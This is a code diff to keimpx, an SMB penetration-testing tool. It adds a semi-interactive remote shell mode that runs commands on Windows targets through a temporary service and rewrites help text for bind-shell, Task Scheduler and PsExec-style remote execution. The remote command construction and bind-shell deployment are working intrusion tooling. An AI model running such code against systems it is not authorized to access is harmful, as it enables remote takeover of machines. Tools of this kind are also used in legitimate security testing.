@@ -498,21 +498,21 @@ class SvcShell(cmd.Cmd):
         if stdout is not None:
             print stdout
 
-    def do_exit(self):
+    def do_exit(self, line):
         return True
 
     def get_output(self):
         def output_callback(data):
             self.__outputBuffer += data
 
-        if self.__mode == 'SHARE':
-            self.transferClient.getFile(self.__share, self.__output, output_callback)
-            self.transferClient.deleteFile(self.__share, self.__output)
-        else:
+        if self.__mode == 'SERVER':
             fd = open(self.__smbserver_dir + '/' + self.__output_file,'r')
             output_callback(fd.read())
             fd.close()
             os.unlink(self.__smbserver_dir + '/' + self.__output_file)
+        else:
+            self.transferClient.getFile(self.__share, self.__output, output_callback)
+            self.transferClient.deleteFile(self.__share, self.__output)
 
     def execute_remote(self, data):
         command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, data, self.__output, self.__batchFile, self.__shell, self.__batchFile)
@@ -688,15 +688,21 @@ bindshell [port] - spawn a shell listening on a TCP port on the target
       This works by upload a custom bind shell, executing it as a service
       and connecting to a TCP port where it listens, by default 4445/TCP.
       If the target is behind a strict firewall it may not work.
-svcshell [mode] [share] - semi-interactive shell
-      TODO: add description.
+svcshell [mode] - semi-interactive shell through a custom Windows Service
+      This works by creating a service to execute a command, redirect its
+      output to a temporary file within a share and retrieving its content,
+      then deleting the service.
+      Mode of operation can be SHARE (default) or SERVER whereby a local
+      SMB server is instantiated to receive the output of the commands. This
+      is useful in the situation where the target machine does not have a
+      writeable share available - no extra ports are required.
 atexec {command} - executes a command through the Task Scheduler service
       Returns the output of such command. No interactive shell, one command
-      at a time.
+      at a time - no extra ports are required.
 psexec [command] - executes a command through SMB named pipes
       Same technique employed by Sysinternal's PsExec. The default command
       is cmd.exe therefore an interactive shell is established. It employs
-      RemComSvc.
+      RemComSvc - no extra ports are required.
 '''
 
     def emptyline(self):
@@ -713,7 +719,7 @@ psexec [command] - executes a command through SMB named pipes
         if stdout is not None:
             print stdout
 
-    def do_exit(self, line=''):
+    def do_exit(self, line):
         '''
         Disconnect the SMB session
         '''
@@ -1183,7 +1189,6 @@ psexec [command] - executes a command through SMB named pipes
         '''
         self.__winreg_key = reg_key
         self.__winreg_value = reg_value
-
         self.__winreg_connect()
         self.__winreg_open()
         self.__winreg_write()
@@ -1194,7 +1199,6 @@ psexec [command] - executes a command through SMB named pipes
         Delete a Windows registry key
         '''
         self.__winreg_key = reg_key
-
         self.__winreg_connect()
         self.__winreg_open()
         self.__winreg_delete()
@@ -1202,10 +1206,8 @@ psexec [command] - executes a command through SMB named pipes
 
     def do_bindshell(self, port):
         '''
-        Deploy a bindshell backdoor listening on a predefined TCP port for
-        incoming connections then spawning a command prompt as SYSTEM.
+        Spawn a shell listening on a TCP port on the target
         '''
-
         connected = False
         srvname = ''.join([random.choice(string.letters) for _ in range(8)])
         local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
@@ -1260,15 +1262,14 @@ psexec [command] - executes a command through SMB named pipes
         time.sleep(1)
         self.do_undeploy(srvname)
 
-    def do_svcshell(self, line):
+    def do_svcshell(self, mode='SHARE'):
         '''
-        TODO
+        Semi-interactive shell through a custom Windows Service
         '''
-
         self.__svcctl_connect()
 
         try:
-            self.shell = SvcShell(self.__svc, self.__mgr_handle, self.trans, 'SHARE')
+            self.shell = SvcShell(self.__svc, self.__mgr_handle, self.trans, mode)
             self.shell.cmdloop()
         except SessionError, e:
             #traceback.print_exc()
@@ -1281,6 +1282,18 @@ psexec [command] - executes a command through SMB named pipes
 
         sys.stdout.flush()
         self.__svcctl_disconnect()
+
+    def do_atexec(self, command):
+        '''
+        Executes a command through the Task Scheduler service
+        '''
+        logger.warn('Command not yet implemented')
+
+    def do_psexec(self, command):
+        '''
+        Executes a command through SMB named pipes
+        '''
+        logger.warn('Command not yet implemented')
 
     def __smb_transport(self, named_pipe):
         '''
